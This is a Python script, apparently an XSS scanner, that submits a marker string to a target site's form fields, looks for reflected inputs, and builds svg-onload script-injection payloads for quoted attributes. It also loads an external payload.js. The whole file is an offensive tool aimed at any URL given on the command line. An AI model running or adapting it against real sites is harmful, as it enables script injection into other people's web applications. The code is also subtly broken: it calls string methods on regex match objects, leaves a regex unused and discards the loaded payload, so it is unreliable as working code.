import sys
import urllib
import requests
import re
from functools import reduce

test = "6ix8uzz"
headers = {
    'User-Agent':'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
    'Accept-Language': 'en-US,en;q=0.5',
    'Accept-Encoding': 'gzip',
    'Connection': 'close',
    'DNT': '1',
    'Upgrade-Insecure-Requests': '1',
}

single_quote_payload = "\'><svg onload=\'init(); function init(){alert(0)}\'"
double_quote_payload = "\"><svg onload=\'init(); function init(){alert(0)}\'"

input_reg = '<input.*?name=\'(.*?)\'.*?>|<input.*?name="(.*?)".*?>'
quotation_reg = f'<.*?=\"({test})\".*?>|<.*?=\'({test})\'.*?>'

# is this the pythonic way ... idk
payload = reduce(lambda x, y : x + y, map(lambda x : x.strip(), open("payload.js").read().split('\n')))

if len(sys.argv) < 2:
    print("usage: python xss.py url")
    sys.exit()

url = sys.argv[1]
if "http://" not in url:
    url = "http://" + url

response = requests.get(url, headers=headers)

data = {}
matches = re.findall(input_reg, response.text)
for match in matches:
    data[match[1]] = test

test_response = requests.get(url, headers=headers, params=data)

# look for test string in the response
injection_sites = [re.match(input_reg, line) for line in test_response.text.split('\n')]
for injection_site in filter(lambda x : x, injection_sites):
    single_quote, double_quote = injection_site.group(1,2)
    if single_quote:
        payload = injection_sites[1].replace(test, single_quote_payload)
        print("payload: " + payload)
    else:
        payload = injection_sites[2].replace(test, double_quote_payload)
        print("payloadx2: " + payload)




